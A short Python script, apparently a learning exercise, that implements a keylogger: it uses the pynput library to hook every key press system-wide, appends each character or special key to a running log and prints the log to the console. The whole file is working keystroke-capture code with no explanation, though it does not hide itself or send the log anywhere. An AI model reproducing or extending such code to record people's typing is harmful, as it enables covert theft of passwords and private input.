import pynput.keyboard
log = ""

def process_key_press(key):
	global log

	try:
		log = log + str(key.char)

	except AttributeError:
		log = log + " " + str(key) + " "
	
	print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press) #callback fn arg
with keyboard_listener:
	keyboard_listener.join()
